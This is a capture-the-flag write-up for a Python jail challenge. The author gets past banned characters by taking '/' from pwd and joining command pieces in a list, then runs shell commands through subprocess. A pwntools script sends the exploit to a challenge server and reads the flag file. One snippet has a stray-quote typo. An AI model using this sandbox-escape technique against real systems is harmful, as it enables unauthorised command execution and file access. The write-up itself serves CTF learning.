# TheOnlyJail

**171 points**

`143.198.219.171:3333`

___

This was my first pyjail challenge ever and so I feel pretty good that I managed to solve it even though it was one of the easier challenges (but still harder that `Crypto1` dammit).

The first thing I tried was calling `ls` with subprocess like so:

```python
import subprocess
subprocess.run("ls", shell=True)
```

It gave the standard directories present in root.

I wanted to look into `home` and so I did the same thing but with home:

```python
subprocess.run("ls home", shell=True)
```

And it gave me `ctf`.

I tried to ls further into the directory but it did not work:

```python
subprocess.run("ls home/ctf", shell=True)
```

The `/` was a banned character.

Ok, I tried basically every banned character like trying to seperate the command into `cd home; ls ctf` or the same with `&&`.

I then discovered that I could get the `/` character by running `pwd` and getting that into a variable with:

```python
slash = subprocess.run("pwd", shell=True, stdout=subprocess.PIPE)
slash = slash.stdout.decode().strip()
```

Now I can construct a command with this `slash` but more problems arose.

I tried the following:

```python
cmd = "ls " + slash + "home" + slash + "ctf"
subprocess.run(cmd, shell=True)
```

But the `+` is also banned!

Sooooo more python shenanigans, I used a list and appended the strings one by one and joined them into a command:

```python
l = list()')
l.append("ls ")
l.append("home")
l.append(slash)
l.append("ctf")
cmd = "".join(l)
subprocess.run(cmd, shell=True)
```

And it worked!!
I got the contents of `/home/ctf` which was the file `flag.txt`.

The final thing for me to do was to cat it out and kaching, win.

The final code I decided to do with `pwntools` just for fun (worked just as well in the commandline)

```python
from pwn import *

# Establish the target process
io = remote('143.198.219.171', 3333)

io.sendline(b'import subprocess')
io.sendline(b'import os')
io.sendline(b'slash = subprocess.run("pwd", shell=True, stdout=subprocess.PIPE)')
io.sendline(b'slash = slash.stdout.decode().strip()')
io.sendline(b'l = list()')
io.sendline(b'l.append("cat ")')
io.sendline(b'l.append("home")')
io.sendline(b'l.append(slash)')
io.sendline(b'l.append("ctf")')
io.sendline(b'l.append(slash)')
io.sendline(b'l.append("flag.txt")')

io.sendline(b'cmd = "".join(l)')
io.sendline(b'print()')
io.sendline(b'print(cmd)')

io.sendline(b'subprocess.run(cmd, shell=True)')

io.interactive()
```

The output was:

```
Welcome to the IIITL Jail! Escape if you can
jail> jail> jail> jail> jail> jail> jail> jail> jail> jail> jail> jail> jail> 
jail> cat home/ctf/flag.txt
jail> ictf{ff8ab219-a90b-44f8-9273-ccc13766f2eb}jail>
```

So the flag is:

> ictf{ff8ab219-a90b-44f8-9273-ccc13766f2eb}